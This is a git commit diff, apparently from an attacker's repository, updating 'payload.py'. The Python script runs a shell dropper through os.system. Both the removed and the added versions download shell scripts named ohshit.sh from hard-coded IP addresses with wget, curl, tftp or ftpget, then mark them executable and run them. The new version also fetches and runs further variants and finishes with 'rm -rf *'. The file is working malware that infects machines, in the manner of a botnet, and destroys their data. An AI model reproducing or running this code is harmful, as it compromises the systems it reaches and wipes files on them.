bd706c732f3de87f68683a08a2605bf319c7f6dd
dekurlass <dekurlaspanel1@gmail.com>
2025-05-23 02:07:28 +0300

    Update payload.py

--- payload.py
+++ payload.py
@@ -1,23 +1,7 @@
 import os
 
 commands = """
-cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;
-if [ ! -f ohshit.sh ]; then
-    if command -v wget >/dev/null 2>&1; then
-        wget http://45.87.120.23/ohshit.sh -O ohshit.sh;
-    elif command -v curl >/dev/null 2>&1; then
-        curl -o ohshit.sh http://45.87.120.23/ohshit.sh;
-    elif command -v tftp >/dev/null 2>&1; then
-        tftp 45.87.120.23 -c get ohshit.sh;
-    elif command -v ftpget >/dev/null 2>&1; then
-        ftpget -v -u anonymous -p anonymous -P 21 45.87.120.23 ohshit.sh ohshit.sh;
-    else
-        echo "No download tool available";
-        exit 1;
-    fi
-    chmod 777 ohshit.sh;
-fi
-sh ohshit.sh;
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.194.177.120/ohshit.sh; curl -O http://185.194.177.120/ohshit.sh; chmod 777 ohshit.sh; sh ohshit.sh; tftp 185.194.177.120 -c get ohshit.sh; chmod 777 ohshit.sh; sh ohshit.sh; tftp -r ohshit2.sh -g 185.194.177.120; chmod 777 ohshit2.sh; sh ohshit2.sh; ftpget -v -u anonymous -p anonymous -P 21 185.194.177.120 ohshit1.sh ohshit1.sh; sh ohshit1.sh; rm -rf ohshit.sh ohshit.sh ohshit2.sh ohshit1.sh; rm -rf * 
 """
 
 os.system(commands)
